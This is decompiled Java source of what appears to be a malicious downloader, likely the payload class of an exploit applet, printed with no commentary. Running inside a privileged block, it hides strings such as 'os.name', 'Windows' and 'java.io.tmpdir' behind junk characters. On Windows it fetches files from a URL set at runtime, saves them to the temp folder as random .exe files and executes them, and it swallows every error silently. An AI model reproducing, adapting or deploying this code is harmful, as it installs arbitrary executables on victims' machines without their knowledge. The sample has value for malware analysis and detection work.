// 
// Decompiled by Procyon v0.5.30
// 

package fiece;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Biutedwc implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final int n2 = 16;
        final byte[] array = new byte[s.length() / n];
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        if (Biutedwc.data == null) {
            return null;
        }
        try {
            if (System.getProperty("o<<<<s.<<name<<<<".replace("<", "")).indexOf("WHHindHHowsHHH".replace("H", "")) >= 0) {
                int int1 = 1;
                if (Biutedwc.cc != null) {
                    int1 = Integer.parseInt(Biutedwc.cc);
                }
                Runtime.getRuntime();
                final int n = 1024;
                for (int i = 0; i < int1; ++i) {
                    Boolean b = true;
                    final URL url = new URL(Biutedwc.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("XXjaXvXXXaXX.XXiXXXXo.XXXtXmpXXXXdXirX".replace("X", "")) + File.separator + Math.random() + ".exe".replace("1", "");
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n2 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n2;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n2 < n) {
                        b = false;
                    }
                    if (!b) {
                        this.execf(Runtime.getRuntime(), string);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public Process execf(final Runtime runtime, final String s) throws Exception {
        return runtime.exec(s);
    }
    
    public Biutedwc() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        Biutedwc.data = null;
        Biutedwc.cc = null;
    }
}
